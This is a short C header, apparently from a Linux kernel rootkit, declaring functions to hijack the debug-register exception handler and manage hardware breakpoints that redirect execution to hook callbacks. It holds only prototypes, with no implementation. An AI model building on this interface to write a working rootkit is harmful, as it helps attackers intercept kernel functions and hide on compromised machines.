#ifndef ROOTKIT_DEBUG_REG_H
# define ROOTKIT_DEBUG_REG_H

//TODO: global
# define INLINE_HOOK 0

void debug_register_hijack_handler(int);
int debug_register_set_bp(void *addr,
        void(*hook)(struct pt_regs *regs, long err),
        int n);
int debug_register_add_bp(void *addr,
        void(*hook)(struct pt_regs *regs, long err));
void debug_register_enable_bp(int n);
void debug_register_disable_bp(int n);
void debug_register_del_bp(int n);
void debug_register_unhijack_handler(void);

#endif /* !ROOTKIT_DEBUG_REG_H */
